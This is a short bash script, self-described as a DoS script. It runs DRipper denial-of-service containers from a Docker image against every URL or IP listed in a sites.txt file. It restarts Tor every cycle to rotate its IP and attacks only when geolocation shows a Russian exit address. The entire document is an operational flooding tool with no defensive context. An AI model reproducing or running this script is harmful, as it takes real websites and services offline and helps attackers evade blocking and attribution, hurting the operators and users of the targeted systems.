#!/bin/bash
# DoS script itself. Will run 2 (you can add more) DRipper containers for each URL/IP specified in sites.txt.
# Create sites.txt, put URL/IP addresses on each line.
# Default value of run time is 3 mins, you can change to whatever you want, 

echo "Starting DRipper containers..."

for i in {1..60}; do
   CURR_IP=$(wget -qO - https://api.ipify.org; echo)
   CHECK_IP=$(curl --silent https://freegeoip.app/csv/$CURR_IP; echo)
   echo $CHECK_IP
   if [[ $CHECK_IP =~ "Russia" ]]; then
      while IFS= read -r line; do
         if [[ $line != '[a-z]*' ]]; then  # checks format of entry (URL/IP)
            docker run -d -it --rm  --entrypoint python nitupkcuf/ddos-ripper:latest DRipper.py -s $(awk -F[/:] '{print "\t" $1}' <<< $line) -p $(awk -F[/:] '{print "\t" $2}' <<< $line) -t 135
            docker run -d -it --rm  --entrypoint python nitupkcuf/ddos-ripper:latest DRipper.py -s $(awk -F[/:] '{print "\t" $1}' <<< $line) -p $(awk -F[/:] '{print "\t" $2}' <<< $line) -t 135
         else
            docker run -d -it --rm  nitupkcuf/ddos-ripper $line   # you can change the amount of runs and connections
            docker run -d -it --rm  nitupkcuf/ddos-ripper $line
         fi
      done < sites.txt  # Don't forget to create file with addresses
      sleep 180 # run time
      docker rm -f $(docker ps --format "{{.ID}}")   # removing containers after 3 mins to change IP
   else
      echo "Location is not Russia, skipping iteration and updating IP..."
      sleep 20
   fi
   systemctl restart tor 2> /dev/null
   sleep 5
done
